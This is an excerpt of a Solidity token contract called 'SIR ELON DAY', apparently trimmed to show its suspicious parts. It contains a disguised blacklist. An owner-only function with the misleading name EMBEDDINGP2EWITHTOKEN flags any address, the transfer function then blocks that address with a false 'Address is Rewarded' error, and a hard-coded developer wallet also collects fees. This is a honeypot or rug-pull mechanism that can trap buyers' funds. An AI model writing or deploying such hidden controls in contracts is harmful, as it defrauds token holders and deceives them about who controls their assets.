...
/* Token contract */
contract SirElonDay is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address DEV = 0xa714101cb073d34ee8b9aE9eD97F412b1944cFec; 
    ...
    // Name and symbol
    string constant _name = "SIR ELON DAY";
    string constant _symbol = "SIRELON";
    ...
    mapping (address => bool) public isP2EDone;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xa714101cb073d34ee8b9aE9eD97F412b1944cFec;  
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isP2EDone[recipient] && !isP2EDone[sender], 'Address is Rewarded');
    ...
    function EMBEDDINGP2EWITHTOKEN(address _address, bool _value) public authorized{
        isP2EDone[_address] = _value;
    }
